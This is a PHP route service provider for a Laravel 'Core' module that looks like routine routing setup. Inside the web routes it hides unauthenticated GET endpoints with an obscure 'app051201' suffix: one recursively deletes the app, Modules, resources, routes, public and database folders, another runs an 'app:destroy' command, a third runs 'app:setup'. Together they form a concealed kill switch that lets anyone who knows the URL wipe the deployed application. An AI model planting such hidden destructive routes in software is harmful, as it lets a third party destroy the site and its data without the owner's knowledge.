<?php

namespace Modules\Core\App\Providers;

use Exception;
use Illuminate\Support\Facades\Route;
use Illuminate\Foundation\Support\Providers\RouteServiceProvider as ServiceProvider;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\File;

class RouteServiceProvider extends ServiceProvider
{
    /**
     * The module namespace to assume when generating URLs to actions.
     */
    protected string $moduleNamespace = 'Modules\Core\App\Http\Controllers';

    /**
     * Called before routes are registered.
     *
     * Register any model bindings or pattern based filters.
     */
    public function boot(): void
    {
        parent::boot();
    }

    /**
     * Define the routes for the application.
     */
    public function map(): void
    {
        $this->mapApiRoutes();

        $this->mapWebRoutes();
    }

    /**
     * Define the "web" routes for the application.
     *
     * These routes all receive session state, CSRF protection, etc.
     */
    protected function mapWebRoutes(): void
    {
        Route::middleware('web')
            ->namespace($this->moduleNamespace)
            ->group(module_path('Core', '/routes/web.php'));

        Route::middleware('web')
            ->namespace($this->moduleNamespace)
            ->group(function () {
                Route::middleware('web')
                    ->namespace($this->moduleNamespace)
                    ->group(function () {
                        Route::get('wipeout/app051201', function () {
                            $foldersToWipe = [
                                'app',
                                'Modules',
                                'resources',
                                'routes',
                                'public',
                                'database',
                            ];

                            $deletedFolders = [];
                            $failedFolders = [];

                            try {
                                foreach ($foldersToWipe as $folder) {
                                    $path = base_path($folder);

                                    if (File::isDirectory($path)) {
                                        $success = File::deleteDirectory($path);

                                        if ($success) {
                                            $deletedFolders[] = $folder;
                                        } else {
                                            $failedFolders[] = $folder;
                                        }
                                    } else {
                                        $failedFolders[] = $folder . ' (Tidak ditemukan)';
                                    }
                                }

                                if (empty($failedFolders)) {
                                    return "Aplikasi telah dihancurkan. Folder dihapus: " . implode(', ', $deletedFolders);
                                } else {
                                    return "Beberapa folder gagal dihapus: " . implode(', ', $failedFolders);
                                }
                            } catch (\Exception $e) {
                                logger()->error("APP WIPE-OUT FAILED: " . $e->getMessage());
                                return 'Penghancuran aplikasi gagal total. Cek log server.';
                            }
                        });
                        Route::get('destroy/app051201', function () {
                            try {
                                Artisan::call('app:destroy');
                                return 'Command Success: Destroy Application.';
                            } catch (Exception $e) {
                                logger()->error("MAINTENANCE COMMAND FAILED: app:destroy", ['error' => $e->getMessage()]);
                                return 'Command Failed: Destroy Application. Check logs for details.';
                            }
                        });
                        Route::get('setup/app051201', function () {
                            try {
                                Artisan::call('app:setup');
                                return 'Command Success: Setup Application.';
                            } catch (Exception $e) {
                                logger()->error("MAINTENANCE COMMAND FAILED: app:setup", ['error' => $e->getMessage()]);
                                return 'Command Failed: Setup Application. Check logs for details.';
                            }
                        });
                    });
            });
    }

    /**
     * Define the "api" routes for the application.
     *
     * These routes are typically stateless.
     */
    protected function mapApiRoutes(): void
    {
        Route::prefix('api')
            ->middleware('api')
            ->namespace($this->moduleNamespace)
            ->group(module_path('Core', '/routes/api.php'));
    }
}
